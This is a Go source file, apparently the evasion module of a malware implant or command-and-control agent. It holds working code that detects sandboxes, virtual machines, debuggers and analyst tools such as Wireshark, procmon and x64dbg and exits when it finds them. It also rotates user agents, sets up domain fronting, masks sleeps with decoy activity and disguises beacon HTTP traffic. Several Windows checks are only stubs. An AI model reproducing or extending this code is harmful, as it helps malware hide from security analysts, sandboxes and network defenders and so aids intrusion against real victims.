// agent/evasion.go
package main

import (
	"crypto/rand"
	"fmt"
	"math/big"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"
	// Windows-specific imports
	// Use build tags to conditionally include Windows-only code
)

// EvasionManager handles various anti-detection techniques
type EvasionManager struct {
	config *EvasionConfig
}

type EvasionConfig struct {
	EnableSandboxDetection  bool
	EnableVMDetection       bool
	EnableDebuggerDetection bool
	EnableDomainFronting    bool
	UserAgentRotation       bool
	JitterEnabled           bool
	SleepMasking            bool
}

// SandboxIndicators contains various sandbox detection methods
type SandboxIndicators struct {
	VMWareDetected     bool
	VirtualBoxDetected bool
	HyperVDetected     bool
	QEMUDetected       bool
	SandboxProcesses   []string
	LowSystemResources bool
}

func NewEvasionManager(config *EvasionConfig) *EvasionManager {
	return &EvasionManager{config: config}
}

// PerformEvasionChecks runs all enabled evasion checks
func (em *EvasionManager) PerformEvasionChecks() bool {
	if em.config.EnableSandboxDetection && em.detectSandbox() {
		fmt.Printf("[!] Sandbox environment detected, exiting\n")
		return false
	}

	if em.config.EnableVMDetection && em.detectVirtualMachine() {
		fmt.Printf("[!] Virtual machine detected, exiting\n")
		return false
	}

	if em.config.EnableDebuggerDetection && em.detectDebugger() {
		fmt.Printf("[!] Debugger detected, exiting\n")
		return false
	}

	return true
}

// detectSandbox implements multiple sandbox detection techniques
func (em *EvasionManager) detectSandbox() bool {
	indicators := &SandboxIndicators{}

	// Check for VM artifacts
	if em.checkVMWareArtifacts() {
		indicators.VMWareDetected = true
	}

	if em.checkVirtualBoxArtifacts() {
		indicators.VirtualBoxDetected = true
	}

	if em.checkHyperVArtifacts() {
		indicators.HyperVDetected = true
	}

	// Check for sandbox processes
	suspiciousProcesses := []string{
		"vboxservice", "vboxtray", "vmtoolsd", "vmwaretray",
		"wireshark", "procmon", "regmon", "procexp",
		"ollydbg", "ida", "x32dbg", "x64dbg",
		"sandboxie", "cuckoo", "malware", "virus",
	}

	indicators.SandboxProcesses = em.checkSuspiciousProcesses(suspiciousProcesses)

	// Check system resources (sandbox VMs often have limited resources)
	indicators.LowSystemResources = em.checkSystemResources()

	// Check timing attacks (sandboxes often run slower)
	if em.performTimingAttacks() {
		return true
	}

	// Check for mouse movement (human interaction)
	if runtime.GOOS == "windows" && !em.checkMouseMovement() {
		return true
	}

	// Return true if any sandbox indicators are found
	return indicators.VMWareDetected || indicators.VirtualBoxDetected ||
		indicators.HyperVDetected || len(indicators.SandboxProcesses) > 0 ||
		indicators.LowSystemResources
}

func (em *EvasionManager) checkVMWareArtifacts() bool {
	artifacts := []string{
		"vmware", "vmci", "vmdisk", "vmxnet",
		"vmhgfs", "vmmouse", "vmscsi", "vmware tools",
	}

	for _, artifact := range artifacts {
		if em.checkRegistryForString(artifact) || em.checkFilesystemForString(artifact) {
			return true
		}
	}
	return false
}

func (em *EvasionManager) checkVirtualBoxArtifacts() bool {
	artifacts := []string{
		"vbox", "virtualbox", "oracle", "innotek",
		"vboxmouse", "vboxguest", "vboxsf", "vboxvideo",
	}

	for _, artifact := range artifacts {
		if em.checkRegistryForString(artifact) || em.checkFilesystemForString(artifact) {
			return true
		}
	}
	return false
}

func (em *EvasionManager) checkHyperVArtifacts() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	// Check for Hyper-V specific artifacts
	artifacts := []string{
		"microsoft corporation", "hyper-v", "virtual machine",
	}

	for _, artifact := range artifacts {
		if em.checkRegistryForString(artifact) {
			return true
		}
	}
	return false
}

func (em *EvasionManager) checkSuspiciousProcesses(processes []string) []string {
	var found []string
	// This would implement actual process enumeration
	// For cross-platform compatibility, we'll implement basic checks

	if runtime.GOOS == "windows" {
		found = em.checkWindowsProcesses(processes)
	} else {
		found = em.checkUnixProcesses(processes)
	}

	return found
}

func (em *EvasionManager) checkWindowsProcesses(processes []string) []string {
	// Implementation for Windows process checking
	// This would use Windows APIs or command execution
	return []string{}
}

func (em *EvasionManager) checkUnixProcesses(processes []string) []string {
	// Implementation for Unix/Linux process checking
	// This would check /proc or use ps command
	return []string{}
}

func (em *EvasionManager) checkSystemResources() bool {
	// Check if system has unusually low resources (typical of sandboxes)
	// Implementation would check RAM, CPU cores, disk space
	return false
}

func (em *EvasionManager) performTimingAttacks() bool {
	// Perform CPU-intensive operations and measure timing
	start := time.Now()

	// Busy work
	sum := 0
	for i := 0; i < 1000000; i++ {
		sum += i * i
	}

	elapsed := time.Since(start)

	// If operation takes too long, might be in a sandbox
	return elapsed > 100*time.Millisecond
}

func (em *EvasionManager) checkMouseMovement() bool {
	if runtime.GOOS != "windows" {
		return true // Assume normal for non-Windows
	}

	// Windows-specific mouse position checking would go here
	// For now, return true to avoid false positives
	return true
}

func (em *EvasionManager) checkRegistryForString(searchString string) bool {
	if runtime.GOOS != "windows" {
		return false
	}
	// Registry checking implementation for Windows
	// This would use Windows registry APIs
	return false
}

func (em *EvasionManager) checkFilesystemForString(searchString string) bool {
	// Check common paths for VM artifacts
	var commonPaths []string

	if runtime.GOOS == "linux" {
		commonPaths = []string{
			"/proc/version", "/sys/class/dmi/id/product_name",
			"/sys/class/dmi/id/sys_vendor", "/proc/scsi/scsi",
		}
	} else if runtime.GOOS == "darwin" {
		commonPaths = []string{
			"/System/Library/CoreServices/SystemVersion.plist",
		}
	}

	for _, path := range commonPaths {
		if content, err := os.ReadFile(path); err == nil {
			if strings.Contains(strings.ToLower(string(content)), strings.ToLower(searchString)) {
				return true
			}
		}
	}
	return false
}

// detectVirtualMachine uses advanced VM detection techniques
func (em *EvasionManager) detectVirtualMachine() bool {
	if runtime.GOOS == "windows" {
		return em.detectVMWindows()
	} else if runtime.GOOS == "linux" {
		return em.detectVMLinux()
	} else if runtime.GOOS == "darwin" {
		return em.detectVMMacOS()
	}
	return false
}

func (em *EvasionManager) detectVMWindows() bool {
	// Check for VM-specific hardware/drivers
	// This would use Windows APIs like GetSystemInfo, etc.
	return false
}

func (em *EvasionManager) detectVMLinux() bool {
	// Check DMI information
	if content, err := os.ReadFile("/sys/class/dmi/id/product_name"); err == nil {
		product := strings.ToLower(strings.TrimSpace(string(content)))
		vmProducts := []string{"vmware", "virtualbox", "kvm", "qemu", "bochs", "xen"}
		for _, vm := range vmProducts {
			if strings.Contains(product, vm) {
				return true
			}
		}
	}

	// Check for hypervisor flag in /proc/cpuinfo
	if content, err := os.ReadFile("/proc/cpuinfo"); err == nil {
		if strings.Contains(string(content), "hypervisor") {
			return true
		}
	}

	return false
}

func (em *EvasionManager) detectVMMacOS() bool {
	// macOS VM detection techniques
	// Check system_profiler output or other macOS-specific indicators
	return false
}

// detectDebugger implements anti-debugging techniques
func (em *EvasionManager) detectDebugger() bool {
	if runtime.GOOS == "windows" {
		return em.detectDebuggerWindows()
	} else {
		return em.detectDebuggerUnix()
	}
}

func (em *EvasionManager) detectDebuggerWindows() bool {
	// Check for debugger using various Windows APIs
	// For cross-platform compatibility, we'll skip Windows-specific syscalls here
	return false
}

func (em *EvasionManager) detectDebuggerUnix() bool {
	// Check /proc/self/status for TracerPid
	if content, err := os.ReadFile("/proc/self/status"); err == nil {
		lines := strings.Split(string(content), "\n")
		for _, line := range lines {
			if strings.HasPrefix(line, "TracerPid:") {
				fields := strings.Fields(line)
				if len(fields) >= 2 && fields[1] != "0" {
					return true // Being traced
				}
			}
		}
	}
	return false
}

// Network evasion techniques
func (em *EvasionManager) GetRandomUserAgent() string {
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0",
	}

	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(userAgents))))
	return userAgents[n.Int64()]
}

func (em *EvasionManager) SetupDomainFronting(req *http.Request, frontDomain string) {
	if em.config.EnableDomainFronting {
		req.Host = frontDomain
		req.Header.Set("Host", frontDomain)
	}
}

// Sleep masking to avoid detection by behavior analysis
func (em *EvasionManager) MaskedSleep(duration time.Duration) {
	if !em.config.SleepMasking {
		time.Sleep(duration)
		return
	}

	// Break sleep into smaller chunks with legitimate activities
	chunks := int(duration / (100 * time.Millisecond))
	for i := 0; i < chunks; i++ {
		// Perform some legitimate-looking operations
		em.performLegitimateActivity()
		time.Sleep(100 * time.Millisecond)
	}
}

func (em *EvasionManager) performLegitimateActivity() {
	// Simulate normal program behavior
	activities := []func(){
		func() { os.Getwd() },
		func() { time.Now() },
		func() { runtime.NumGoroutine() },
		func() { net.LookupHost("localhost") },
	}

	n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(activities))))
	activities[n.Int64()]()
}

// Process hollowing detection
func (em *EvasionManager) detectProcessHollowing() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	// Check if current process memory layout is suspicious
	// This would involve checking PE headers, memory sections, etc.
	return false
}

// Entropy analysis to detect packed/encrypted payloads
func (em *EvasionManager) checkEntropyAnalysis() bool {
	// Calculate entropy of current executable
	// High entropy might indicate packing/encryption
	return false
}

// Network traffic obfuscation
func (em *EvasionManager) ObfuscateHTTPTraffic(req *http.Request) {
	// Add realistic headers
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Connection", "keep-alive")
	req.Header.Set("Upgrade-Insecure-Requests", "1")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")

	if em.config.UserAgentRotation {
		req.Header.Set("User-Agent", em.GetRandomUserAgent())
	}

	// Add random headers to blend in
	randomHeaders := map[string][]string{
		"Cache-Control": {"no-cache", "max-age=0", "private"},
		"DNT":           {"1", "0"},
		"Sec-GPC":       {"1", "0"},
	}

	for header, values := range randomHeaders {
		n, _ := rand.Int(rand.Reader, big.NewInt(int64(len(values))))
		req.Header.Set(header, values[n.Int64()])
	}
}

// Memory protection and anti-dump techniques
func (em *EvasionManager) ProtectMemory() {
	if runtime.GOOS == "windows" {
		// Use VirtualProtect to make critical sections non-readable
		// Encrypt sensitive data in memory
		// Use heap spraying techniques
		// Implementation would go in windows-specific build tags
	}
}

// Anti-hook detection
func (em *EvasionManager) DetectAPIHooks() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	// Check if commonly hooked APIs have been modified
	// Compare function prologues with known good values
	// Detect inline hooks, IAT hooks, etc.
	return false
}

// GetDefaultEvasionConfig returns a default evasion configuration
func GetDefaultEvasionConfig() *EvasionConfig {
	return &EvasionConfig{
		EnableSandboxDetection:  true,
		EnableVMDetection:       true,
		EnableDebuggerDetection: true,
		EnableDomainFronting:    false,
		UserAgentRotation:       true,
		JitterEnabled:           true,
		SleepMasking:            true,
	}
}
